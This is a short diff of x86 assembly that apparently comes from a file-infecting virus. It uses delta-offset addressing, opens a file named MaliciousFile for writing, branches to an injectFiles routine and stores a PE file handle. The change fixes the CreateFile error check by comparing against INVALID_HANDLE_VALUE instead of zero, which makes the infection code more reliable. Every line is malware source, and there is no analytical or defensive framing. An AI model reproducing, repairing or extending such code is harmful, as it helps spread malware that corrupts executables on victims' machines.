@@ -119,7 +119,7 @@ push	0
 push	GENERIC_WRITE
 PDELTA	MaliciousFile
 call	[DELTA pCreateFile]
-cmp	eax, 0
+cmp	eax, INVALID_HANDLE_VALUE
 je	injectFiles
 mov	[DELTA PeFile], eax
 
